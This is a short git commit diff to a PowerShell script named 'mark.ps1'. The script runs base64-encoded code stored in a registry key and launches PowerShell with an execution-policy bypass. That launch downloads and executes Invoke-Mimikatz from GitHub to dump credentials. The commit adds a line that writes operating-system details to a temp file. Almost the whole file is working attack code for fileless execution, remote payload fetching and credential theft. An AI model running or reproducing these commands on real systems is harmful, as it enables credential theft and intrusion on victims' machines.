fd221e5f28c8187138650f6a1b4a87644625c0c0
inwestallis <inwestallis@gmail.com>
2020-05-03 05:48:22 -0700

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -1,5 +1,6 @@
 iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
+Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property * > %Temp%\power.txt
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
 
 
